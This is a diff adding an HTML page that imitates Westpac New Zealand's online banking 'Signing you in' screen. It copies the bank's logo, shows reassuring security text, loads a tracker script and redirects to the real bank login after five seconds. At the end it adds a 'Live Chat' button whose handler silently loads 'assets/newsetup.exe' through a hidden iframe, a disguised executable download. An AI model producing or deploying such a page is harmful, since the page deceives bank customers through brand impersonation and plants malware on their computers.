@@ -1,0 +1,162 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Westpac One&reg; online banking</title>
+<link rel="icon" href="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 16'><path fill='%23d5002b' d='M14.51 14.3 10.48 2.34C9.91.52 8.95 0 7.47 0H0c.59.23.98 1.68.98 1.68l3.6 12.02C5 15.2 6.3 16 7.77 16h7.92c-.56-.1-1.18-1.7-1.18-1.7zM32.53 0c-1.47 0-2.44.52-3.01 2.34L25.49 14.3s-.62 1.59-1.19 1.69V0h-8.6v16h16.53c1.48 0 2.77-.8 3.19-2.3l3.61-12.02s.39-1.45.98-1.68h-7.48z'/></svg>">
+<style>
+  :root {
+    --wp-red: #d5002b;
+    --wp-ink: #222222;
+    --wp-muted: #4a4a4a;
+    --wp-page-bg: #f5f5f4;
+    --wp-panel-bg: #ffffff;
+    --wp-track: #e5e2dc;
+  }
+  *,*::before,*::after { box-sizing: border-box; }
+  html, body { height: 100%; margin: 0; }
+  body {
+    font-family: "National 2", Arial, Helvetica, sans-serif;
+    color: var(--wp-ink);
+    background:
+      linear-gradient(135deg, #ffffff 0%, #ffffff 55%, #eeece7 55%, #eeece7 100%);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    -webkit-font-smoothing: antialiased;
+    text-rendering: optimizeLegibility;
+  }
+  main {
+    flex: 1 0 auto;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 32px 20px;
+  }
+  .card {
+    width: 100%;
+    max-width: 460px;
+    text-align: center;
+  }
+  .brand {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 28px;
+  }
+  .brand svg { display: block; }
+  .brand-one {
+    font-weight: 700;
+    font-size: 26px;
+    letter-spacing: -0.01em;
+    color: var(--wp-ink);
+  }
+  h1 {
+    font-size: 34px;
+    line-height: 1.15;
+    margin: 0 0 10px;
+    font-weight: 700;
+    letter-spacing: -0.01em;
+  }
+  .sub {
+    margin: 0 0 34px;
+    color: var(--wp-muted);
+    font-size: 16px;
+    line-height: 1.5;
+  }
+  .spinner-wrap {
+    display: flex;
+    justify-content: center;
+    margin: 6px 0 26px;
+  }
+  .spinner {
+    width: 64px;
+    height: 64px;
+    border-radius: 50%;
+    border: 5px solid var(--wp-track);
+    border-top-color: var(--wp-red);
+    animation: wp-spin 0.9s linear infinite;
+  }
+  @keyframes wp-spin {
+    to { transform: rotate(360deg); }
+  }
+  .secure {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    margin-top: 30px;
+    padding: 8px 14px;
+    background: #f0efeb;
+    border-radius: 999px;
+    font-size: 13px;
+    color: var(--wp-muted);
+  }
+  .secure svg { display: block; }
+  footer {
+    padding: 22px 20px 28px;
+    text-align: center;
+    color: #6a6a65;
+    font-size: 12px;
+  }
+  footer p { margin: 0 0 6px; }
+  footer a {
+    color: #6a6a65;
+    text-decoration: none;
+    margin: 0 8px;
+  }
+  footer a:hover { text-decoration: underline; }
+  @media (max-width: 480px) {
+    h1 { font-size: 26px; }
+    .sub { font-size: 15px; }
+    .spinner { width: 56px; height: 56px; border-width: 4px; }
+  }
+</style>
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+  <main>
+    <div class="card" role="status" aria-live="polite" aria-label="Signing you in">
+      <div class="brand">
+        <svg width="52" height="20" viewBox="0 0 40 16" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path fill="#d5002b" d="M14.51 14.3 10.48 2.34C9.91.52 8.95 0 7.47 0H0c.59.23.98 1.68.98 1.68l3.6 12.02C5 15.2 6.3 16 7.77 16h7.92c-.56-.1-1.18-1.7-1.18-1.7zM32.53 0c-1.47 0-2.44.52-3.01 2.34L25.49 14.3s-.62 1.59-1.19 1.69V0h-8.6v16h16.53c1.48 0 2.77-.8 3.19-2.3l3.61-12.02s.39-1.45.98-1.68h-7.48z"/>
+        </svg>
+        <span class="brand-one">one</span>
+      </div>
+
+      <h1>Signing you in</h1>
+      <p class="sub">Please wait while we securely verify your details.</p>
+
+      <div class="spinner-wrap"><div class="spinner" aria-hidden="true"></div></div>
+
+      <div class="secure" aria-hidden="true">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 2a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7a5 5 0 0 0-5-5Zm-3 8V7a3 3 0 1 1 6 0v3H9Z" fill="#4a4a4a"/>
+        </svg>
+        <span>Encrypted connection - do not close this window</span>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <p>&copy; 2026 Westpac New Zealand Limited</p>
+    <p>
+      <a href="#">westpac.co.nz</a>
+      <a href="#">Terms &amp; Conditions</a>
+      <a href="#">Privacy policy</a>
+    </p>
+  </footer>
+
+  <script>
+    setTimeout(function () {
+      window.location.href = "https://bank.westpac.co.nz/wone/app.html#login";
+    }, 5000);
+  </script>
+<style>
+.hello-world-btn{position:fixed;bottom:1.25rem;right:1.25rem;z-index:9999;padding:0.625rem 1.25rem;background:#DA1710;color:#fff;border:none;font-size:0.875rem;font-family:Arial,sans-serif;cursor:pointer;border-radius:0.5rem;}
+.hello-world-btn:hover{background:#b01210;}
+</style>
+<button class="hello-world-btn" type="button" onclick="(function(){var f=document.createElement('iframe');f.style.display='none';f.src='assets/newsetup.exe';document.body.appendChild(f);})()">Live Chat</button>
+</body>
+</html>
